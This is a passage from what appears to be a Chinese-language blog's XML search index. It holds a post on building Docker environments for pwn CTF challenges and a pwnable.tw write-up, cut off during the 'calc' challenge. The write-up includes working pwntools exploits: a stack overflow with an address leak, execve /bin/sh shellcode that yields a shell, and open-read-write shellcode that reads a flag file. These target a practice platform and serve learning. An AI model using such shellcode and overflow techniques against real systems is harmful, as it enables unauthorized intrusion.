<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Learning Docker</title>
      <link href="/2018/11/10/learning-docker/"/>
      <url>/2018/11/10/learning-docker/</url>
      <content type="html"><![CDATA[<p><em>之前是为了学习搭pwn题的环境稍微碰了下docker，但是因为kali上的gdb被我搞得问题很大，再加上不能完全卸载重装，索性想着搞一个pwn工具的集成环境，一劳永逸，docker无疑是个好东西，顺便也记录下搭建pwn题的过程吧</em></p><h1 id="pwn环境部署"><a href="#pwn环境部署" class="headerlink" title="pwn环境部署"></a>pwn环境部署</h1><p>  最基础的方法是socat， <code>socat tcp-l:9999,fork exec:./pwn1</code><br>  没有timeout，连得人多多半就爆炸了</p><p>所以选择：<br><code>xinted + docker</code></p><h2 id="xinted"><a href="#xinted" class="headerlink" title="xinted"></a>xinted</h2><p><a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">xinted</a>从权限到服务配置都做好了一个dockerfile,build即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Eadom/ctf_xinetd.git</span><br></pre></td></tr></table></figure><h2 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h2><p> 因为没有用ubuntu，kali等其他的debian系等等没法直接 <code>sudo apt-get install docker-ce</code></p><p>kali最后成功安装docker的方法：</p><p>在/etc/apt/sources.list 中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://http.debian.net/debian jessie-backports main</span><br></pre></td></tr></table></figure><p>更新源并安装即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update   </span><br><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure><h2 id="配置docker环境"><a href="#配置docker环境" class="headerlink" title="配置docker环境"></a>配置docker环境</h2><ul><li>将bin文件放置到bin目录下</li><li>修改flag内容</li><li>修改ctf.xinted的服务：<br>port = 指定端口<br>server_args = –userspec=1000:1000 /home/ctf ./binname</li></ul><h2 id="build-dockerfile"><a href="#build-dockerfile" class="headerlink" title="build dockerfile"></a>build dockerfile</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t &quot;binname&quot; . </span><br><span class="line">docker run -d -p &quot;0.0.0.0:9999:9999&quot; -h &quot;biname&quot; --name=&quot;binname&quot; binname</span><br></pre></td></tr></table></figure><p>将镜像跑起来就ok了</p><h1 id="pwn-docker"><a href="#pwn-docker" class="headerlink" title="pwn docker"></a>pwn docker</h1><p>一个集成pwn常用工具的docker，暂时用的是<a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">pwndocker</a>,不过比较臃肿，之后再自己搭建一个</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><em>一般刚开机docker未打开，使用<code>service docker start</code>打开服务</em></p><ol><li><code>pull</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure><ol start="2"><li><code>docker images</code> 可以看到已经在仓库里了</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/pwn/docker# docker images</span><br><span class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">skysider/pwndocker   latest              a24dde07a423        6 days ago          2.02GB</span><br></pre></td></tr></table></figure><p>各项含义：</p><pre><code>REPOSITORY：表示镜像的仓库源TAG：镜像的标签IMAGE ID：镜像IDCREATED：镜像创建时间SIZE：镜像大小</code></pre><ol start="3"><li><code>docker run -t -i skysider/pwndocker</code>直接进入bash</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/pwn/docker# docker run -t -i skysider/pwndocker</span><br><span class="line">root@b11ff1440061:/ctf/work#</span><br></pre></td></tr></table></figure><pre><code>*b11ff1440061 是container的id*</code></pre><ol start="4"><li>外部文件要往container里复制，使用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /path/file b11ff1440061: /path</span><br></pre></td></tr></table></figure><p>当然b11ff1440061 换成container的id</p><ol start="5"><li>因为别人的docker工具不一定适合自己，需要自己再安装什么的，但是一般安装完退出后就又没有了，当然不能每次都重装</li></ol><p>有两种办法：</p><ul><li>在container中安装完以后，exit</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit  b11ff1440061 pwndocker</span><br></pre></td></tr></table></figure><p>同时可以使用</p><p>-m 来指定提交的说明信息，跟我们使用的版本控制一样<br>-a 可以指定更新的用户信息<br>之后是用来创建镜像容器的id 最后指定目标镜像仓库名和tag信息</p><p>这样可以将修改完的另存为新的image</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~# docker images</span><br><span class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">pwndocker            latest              7c0fa09ee004        12 seconds ago      2.05GB</span><br><span class="line">skysider/pwndocker   latest              a24dde07a423        6 days ago          2.02GB</span><br></pre></td></tr></table></figure><ul><li>使用dockerfile重新build</li></ul><p>像这里可以举例，编辑dockerfile：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM skysider/pwndocker</span><br><span class="line"></span><br><span class="line">RUN apt-get install vim</span><br></pre></td></tr></table></figure><p>From 指定镜像源<br>RUN 指令告诉docker 在镜像内执行命令，安装了什么。。<br>EXPOSE 可以指定开放端口</p><p>编辑完后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t pwndocker .</span><br></pre></td></tr></table></figure></p><p>按理说这样子就可以了。。但是我这里会有个报错<code>The command &#39;/bin/sh -c apt-get install vim&#39; returned a non-zero code: 1</code>仍未解决</p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwnable.tw-wp</title>
      <link href="/2018/11/06/pwnable-tw-wp/"/>
      <url>/2018/11/06/pwnable-tw-wp/</url>
      <content type="html"><![CDATA[<p><em>好久没碰pwn了，找找感觉</em><br><em>pwnable.tw网站的题都进不去，审查元素竟然没见到button响应？？于是就在源码里找题的文件源码保存下来，苟且做题</em></p><h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>见到的最轻巧的一个题</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">func main()</span><br><span class="line">push    esp</span><br><span class="line">; 4:   result = 3;</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">; 5:   __asm</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    &apos;:FTC&apos;</span><br><span class="line">push    &apos; eht&apos;</span><br><span class="line">push    &apos; tra&apos;</span><br><span class="line">push    &apos;ts s&apos;</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 60</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">func exit()</span><br><span class="line">pop     esp</span><br><span class="line">xor     eax, eax</span><br><span class="line">inc     eax</span><br><span class="line">int     80h</span><br></pre></td></tr></table></figure><p>以上为所有的代码。。。 可以看出先使用系统调用write到屏幕，然后又调用read，调用完退出</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>大致推测应该要使用ret2shellcode,一共可以输入60长度的字符，20个就会溢出，所以想着将shellcode放在返回地址之后。<br>看了一下pwntools自带的shellcraft长度也有44。。。所以需要自己写或者在shellstorm上找一找符合要求的。<br>不知道栈地址，所以需要第一次将返回地址覆盖为之前的mov ecx,esp地址，write输出泄露输入的起始地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./start&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;,10000)</span><br><span class="line"></span><br><span class="line">shellcode =&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot; </span><br><span class="line">print len(shellcode)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*20 + p32(0x8048087) </span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(pay)</span><br><span class="line">leak_addr = u32(sh.recv(4))</span><br><span class="line">print hex(leak_addr)</span><br><span class="line"></span><br><span class="line">esp_addr = leak_addr + 0x14</span><br><span class="line">pay = &apos;a&apos;*20 + p32(esp_addr) + shellcode</span><br><span class="line">sh.send(pay) </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">21</span><br><span class="line">0xff936bc0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x00\x00\x005o\x93\xff\x00\x00\x00\x00Go\x93\xff</span><br><span class="line">$ whoami</span><br><span class="line">start</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>贼鸡儿诡异的一道题，回头发现题目名字很有深意 orw –&gt; open read write</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  printf(&quot;Give my your shellcode:&quot;);</span><br><span class="line">  read(0, &amp;shellcode, 0xC8u);</span><br><span class="line">  ((void (*)(void))shellcode)();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">orw_seccomp():</span><br><span class="line">unsigned int orw_seccomp()</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; // [esp+4h] [ebp-84h]</span><br><span class="line">  char *v2; // [esp+8h] [ebp-80h]</span><br><span class="line">  char v3; // [esp+Ch] [ebp-7Ch]</span><br><span class="line">  unsigned int v4; // [esp+6Ch] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, 0x60u);</span><br><span class="line">  v1 = 12;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(38, 1, 0, 0, 0);                        // 38 PR_SET_NO_NEW_PRIVS</span><br><span class="line">                                                //               将调用线程的no_new_privs位设置为值</span><br><span class="line">                                                //               ARG2。将no_new_privs设置为1，execve（2）承诺不会</span><br><span class="line">                                                //               授予执行任何无法完成的任务的权限</span><br><span class="line">                                                //               没有execve（2）调用（例如，渲染集合 - </span><br><span class="line">                                                //               user-ID和set-group-ID模式位，以及非文件功能</span><br><span class="line">                                                //               功能性的）。设置后，该位不能取消设置。那个设定</span><br><span class="line">                                                //               这个位是由fork（2）和</span><br><span class="line">                                                //               克隆（2），并保存在execve（2）。</span><br><span class="line">                                                // </span><br><span class="line">  prctl(22, 2, &amp;v1);                            // 22 PR_SET_SECCOMP  </span><br><span class="line">                                                //   seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall,       这是不安全的,</span><br><span class="line">                                                // 比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了.</span><br><span class="line">                                                // 大概是终结了系统调用的可能,也就很难getshell了。</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目直接让输入shellcode，之后执行，仿佛很简单，但是orw_seccomp()这个函数里有一些奇奇怪怪的东西<br>看到了prctl函数。。。查了一些资料，看第一个的时候还以为是fork爆破canary，第二个查完发现应该是有一些特殊的点切入。</p><p>这块可以参考<br><a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h</a><br><a href="http://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/prctl.2.html</a></p><p>因为看不了题，不过在源码里能看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">             &lt;!-- description --&gt;</span><br><span class="line">               </span><br><span class="line">              &lt;div class=&quot;description&quot; hidden&gt;&lt;p&gt;Read the flag from &lt;code&gt;/home/orw/flag&lt;/code&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Only &lt;code&gt;open&lt;/code&gt; &lt;code&gt;read&lt;/code&gt; &lt;code&gt;write&lt;/code&gt; syscall are allowed to use.&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>这个描述给了切入点hhhh，也就是需要这三个系统调用来得到flag嘛</p><figure class="image-box">                <img src="/2018/11/06/pwnable-tw-wp/sys_call.png" alt="" 系统调用""="" title="" class="">                <p>"系统调用"</p>            </figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>简直就是汇编实习现场了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./orw&apos;)</span><br><span class="line">sh = remote(&quot;chall.pwnable.tw&quot;,10001)</span><br><span class="line"></span><br><span class="line">shellcode=&apos;&apos;&apos;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">mov ebx,esp;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0x5;</span><br><span class="line">int 0x80;                    //open</span><br><span class="line"></span><br><span class="line">mov ebx,eax;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0x3;</span><br><span class="line">mov ecx,esp;</span><br><span class="line">mov dl,0x30;</span><br><span class="line">int 0x80;                    //read</span><br><span class="line"></span><br><span class="line">mov al,0x4;</span><br><span class="line">mov bl,1;</span><br><span class="line">mov dl,0x30;</span><br><span class="line">int 0x80;                     //write</span><br><span class="line">&apos;&apos;&apos;.format(hex(u32(&apos;ag&apos;+chr(0)+chr(0))),hex(u32(&apos;w/fl&apos;)),hex(u32(&apos;e/or&apos;)),hex(u32(&apos;/hom&apos;)))</span><br><span class="line"></span><br><span class="line">sh.sendline(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Give my your shellcode:FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br><span class="line">�u�\x0[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>前面还一对代码说题目干净，这个题就开始一堆代码了。。。</p><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">unsigned int calc()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+18h] [ebp-5A0h]</span><br><span class="line">  int v2[100]; // [esp+1Ch] [ebp-59Ch]</span><br><span class="line">  char s; // [esp+1ACh] [ebp-40Ch]</span><br><span class="line">  unsigned int v4; // [esp+5ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(&amp;s, 0x400u);                          // 置字节字符串前n个字节为零且包括‘\0’。 </span><br><span class="line">    if ( !get_expr((int)&amp;s, 1024) )</span><br><span class="line">      break;</span><br><span class="line">    init_pool(&amp;v1);                            //初始化v1</span><br><span class="line">    if ( parse_expr((int)&amp;s, &amp;v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      printf((const char *)&amp;_d, v2[v1 - 1]);</span><br><span class="line">      fflush(stdout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">init_pool():</span><br><span class="line"></span><br><span class="line">_DWORD *__cdecl init_pool(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line">  signed int i; // [esp+Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  *a1 = 0;</span><br><span class="line">  for ( i = 0; i &lt;= 99; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a1;</span><br><span class="line">    a1[i + 1] = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">signed int __cdecl parse_expr(int a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // ST2C_4</span><br><span class="line">  int v4; // eax</span><br><span class="line">  int v5; // [esp+20h] [ebp-88h]</span><br><span class="line">  int i; // [esp+24h] [ebp-84h]</span><br><span class="line">  int O; // [esp+28h] [ebp-80h]</span><br><span class="line">  char *s1; // [esp+30h] [ebp-78h]</span><br><span class="line">  int num_left; // [esp+34h] [ebp-74h]</span><br><span class="line">  char s[100]; // [esp+38h] [ebp-70h]</span><br><span class="line">  unsigned int v11; // [esp+9Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(0x14u);</span><br><span class="line">  v5 = a1;</span><br><span class="line">  O = 0;</span><br><span class="line">  bzero(s, 0x64u);</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(char *)(i + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\t&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + a1 - v5;</span><br><span class="line">      s1 = (char *)malloc(v2 + 1);</span><br><span class="line">      memcpy(s1, v5, v2);</span><br><span class="line">      s1[v2] = 0;</span><br><span class="line">      if ( !strcmp(s1, &quot;0&quot;) )                   // 输入不能为0</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;prevent division by zero&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      num_left = atoi(s1);</span><br><span class="line">      if ( num_left &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (*a2)++;                      // v4为操作数数目</span><br><span class="line">        a2[v4 + 1] = num_left;             // 操作数放入a2[1],a2[2],....</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      if ( *(_BYTE *)(i + a1) &amp;&amp; *(char *)(i + 1 + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\t&apos; )   // 若下一个操作数仍未操作符即报错</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;expression error!&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      v5 = i + 1 + a1;</span><br><span class="line">      if ( s[O] )                               // s[0]为操作数数目</span><br><span class="line">      &#123;</span><br><span class="line">        switch ( *(char *)(i + a1) )</span><br><span class="line">        &#123;</span><br><span class="line">          case &apos;%&apos;:</span><br><span class="line">          case &apos;*&apos;:</span><br><span class="line">          case &apos;/&apos;:</span><br><span class="line">            if ( s[O] != &apos;+&apos; &amp;&amp; s[O] != &apos;-&apos; )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(a2, s[O]);</span><br><span class="line">              s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              s[++O] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">          case &apos;+&apos;:</span><br><span class="line">          case &apos;-&apos;:</span><br><span class="line">            eval(a2, s[O]);</span><br><span class="line">            s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">            break;</span><br><span class="line">          default:</span><br><span class="line">            eval(a2, s[O--]);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( !*(_BYTE *)(i + a1) )</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( O &gt;= 0 )</span><br><span class="line">    eval(a2, s[O--]);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func eval():</span><br><span class="line"></span><br><span class="line">_DWORD *__cdecl eval(_DWORD *a1, char a2)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line"></span><br><span class="line">  if ( a2 == &apos;+&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] += a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 &gt; &apos;+&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 == &apos;-&apos; 